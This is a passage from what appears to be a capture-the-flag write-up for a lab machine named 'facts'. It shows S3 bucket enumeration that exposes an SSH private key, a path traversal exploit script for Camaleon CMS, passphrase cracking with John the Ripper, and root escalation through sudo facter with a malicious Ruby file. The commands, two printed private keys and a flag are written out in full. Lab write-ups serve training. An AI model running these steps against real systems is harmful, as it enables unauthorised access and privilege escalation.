2025-09-11 14:07:03     222436 firstwebcam.png
2025-09-11 14:07:03     128158 georgewashingtonslaves.png
2025-09-11 14:07:03      34816 logopage.png
2025-09-11 14:07:03      16886 logopage2.png
2025-09-11 14:07:02      80796 pressureupbeat.png
2025-09-11 14:07:02      24792 primary-question-mark.png
2025-09-11 14:07:02     341284 smallanimals.png
2025-09-11 14:07:02     332397 superiorpeople.png
2025-09-11 14:07:01      39579 vanilla.png
2025-09-11 14:07:01      35769 youtubewatchhours.png

```

removing the `randomfacts` bucket, taking one step back I find another bucket named `internal`on the server

```bash
> aws --profile facts s3 ls --endpoint-url http://facts.htb:54321
2025-09-11 14:06:52 internal
2025-09-11 14:06:52 randomfacts
```

Inspecting the `internal` bucket : 

```bash
> aws --profile facts s3 ls s3://internal --endpoint-url http://facts.htb:54321
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-08 19:45:13        220 .bash_logout
2026-01-08 19:45:13       3900 .bashrc
2026-01-08 19:47:17         20 .lesshst
2026-01-08 19:47:17        807 .profile
> aws --profile facts s3 ls s3://internal/.ssh/ --endpoint-url http://facts.htb:54321
2026-05-30 11:25:03         82 authorized_keys
2026-05-30 11:25:03        464 id_ed25519
```

Inspecting the private key in the `internal` bucket

```bash
~ > aws --profile facts s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519 --endpoint-url http://facts.htb:54321  

> cat ./id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDkx1afs0
fc9sVe97njuHwPAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIOswvj/47UxTaatq
ru59JYoNHAU3UXJgC3wP0cXLMkWVAAAAoEI18NtLPIjsLxGS4HpgxVMi76OP5UKT1f5xrt
/lWn5Bu5VgmJ0BvLcKFQdkckhHD6z4icVH1ndSGOldirHIoub7Yaf4aLnMYlIPkslEnUro
jW11dyrQ/ZI/iABXwDRJ6SWXXvfXCvlQD6+K91FCqWhmWSbipT1tN3MAAMVuQHs9ZkCT5+
FbZZW+mAdRiP90k9wBZAM3v+izXgzBcmHUswU=
-----END OPENSSH PRIVATE KEY-----
```

Cross-referencing `/etc/passwd` with the S3 bucket structure confirmed the `internal` bucket mapped to `trivia`'s home directory at `/home/trivia`. Both the path traversal and S3 download returned identical SSH private keys, confirming the user

```bash
> python3 CVE-2024-46987.py -u http://facts.htb --user bob -p bob /home/trivia/.ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAuOPcmBP
KD6R6LRP5fkXHjAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIN0KVrzc3/QdG09D
dMmMC9q8TXhh/beaDNOCIg6W7li9AAAAoMFy6o1mkZ5ozWYN1CguoWkLvC/CgGacowA2cy
uXmu7DK1oVRp/5K8y822gC62lO94xBn2VQda1fU/ldMyoLzBXkDj34S4BUR2mfEX2B6X2c
oUCR/6zvy/k1wVJ2s45gegvwuV5fIEK9lXyMvWdzN4oB43QObk1zn9jCcJv83EKXP9b3NQ
xFv2dnWbukYAtvpghrhmu6YsED8/t9H9W/vyw=
-----END OPENSSH PRIVATE KEY-----
```

```bash
> ssh -i ./id_ed25519 trivia@facts.htb
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 for './id_ed25519' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "./id_ed25519": bad permissions
trivia@facts.htb's password: 
Permission denied, please try again.

> chmod 600 ./id_ed25519
> ssh -i ./id_ed25519 trivia@facts.htb
Enter passphrase for key './id_ed25519': 

```

We need to crack the passphrase for that private key.

Using ssh2john to first transform the ssh private key to a format recognizable by john

And then using john : 

```bash
> john-the-ripper/run/john --wordlist=Documents/rockyou.txt hash-facts.txt
ssh-opencl: Cipher value of 6 is not yet supported with OpenCL
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status

dr[...]lz      (./id_ed25519)     
1g 0:00:00:48 DONE (2026-05-30 14:54) 0.02073g/s 66.33p/s 66.33c/s 66.33C/s adriano..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The passphrase for that private key is dra[...]lz

```bash
> ssh -i ./id_ed25519 trivia@facts.htb
Enter passphrase for key './id_ed25519': 
Last login: Wed May 13 13:08:02 UTC 2026 from 10.10.14.3 on ssh
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat May 30 12:57:08 PM UTC 2026

  System load:           0.08
  Usage of /:            72.2% of 7.28GB
  Memory usage:          19%
  Swap usage:            0%
  Processes:             219
  Users logged in:       1
  IPv4 address for eth0: 10.129.10.124
  IPv6 address for eth0: dead:beef::a0de:adff:febc:8ff0


1 update can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
trivia@facts:~$
trivia@facts:~$ cd ..
trivia@facts:/home$ ls
trivia  william
trivia@facts:/home$ cd william/
trivia@facts:/home/william$ ls
user.txt
trivia@facts:/home/william$ cat user.txt
0cb2ee02cf06e5401b8fab6c13c97778
 

```

Found user flag for user `william`.
## 4. Privilege Escalation

Checking the privileges for user trivia : 
```bash
trivia@facts:/home/william$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

Found a program called facter that trivia can run, facter is a tool written in ruby https://github.com/puppetlabs/facter

We can then write a one-liner in ruby in order to spawn a shell.
Since we can specify to facter which directory to start with, we can specify our temp directory containing the malicious file. since trivia has sudo rights to execute facter, we now have rooted the machine and we can retrieve the root flag.

```bash
trivia@facts:/home/william$ echo 'exec "/bin/bash -p"' > /tmp/exploit.rb
trivia@facts:/home/william$ sudo /usr/bin/facter --custom-dir /tmp
root@facts:/home/william# cd
root@facts:~ ls
minio-binaries  ministack  root.txt  snap
root@facts:~ cat root.txt 
```

## 5. Lessons Learned

Actively searching vulnerabilities. Intercepting requests via Burp Suite and forwarding a parameter to gain full admin access. 

Learn about aws s3 and navigating through server and files.

Finding SSH keys through a S3 bucket containing sensitive information, cross-referencing that information to find the SSH username via a path traversal exploit in Camaleon CMS.

Using `sudo -l` to verify rights on this machine and finding a possible way for privilege escalation.

Using a ruby tool that can be executed as sudo on the machine to gain root access.
